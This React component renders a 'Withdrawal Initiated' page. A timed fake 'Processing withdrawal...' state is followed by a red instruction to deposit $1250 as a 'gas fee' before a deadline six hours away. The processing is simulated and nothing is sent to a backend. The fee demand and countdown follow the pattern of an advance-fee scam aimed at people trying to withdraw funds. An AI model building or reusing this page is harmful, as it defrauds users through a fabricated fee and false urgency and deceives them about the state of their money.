import React, { useEffect, useState } from "react";
import { useLocation } from "react-router-dom";

export default function WithdrawalPending() {
  const { state } = useLocation();
  const { method, amount } = state || {};
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  // Calculate deadline 6 hours from now
  const deadline = new Date(Date.now() + 6 * 60 * 60 * 1000).toLocaleString();

  return (
    <div className="p-6 max-w-md mx-auto bg-white rounded shadow text-center">
      {loading ? (
        <p className="text-indigo-600 font-semibold">
          Processing withdrawal...
        </p>
      ) : (
        <>
          <h2 className="text-xl font-bold mb-4 text-indigo-700">
            Withdrawal Initiated
          </h2>
          <p className="mb-2">
            <strong>Method:</strong> {method}
          </p>
          <p className="mb-2">
            <strong>Amount:</strong> ${amount}
          </p>
          <p className="mt-4 text-red-600 font-semibold">
            Instruction: Please deposit $1250 as a gas fee into your account
            before <strong>{deadline}</strong> to complete the withdrawal.
          </p>
        </>
      )}
    </div>
  );
}
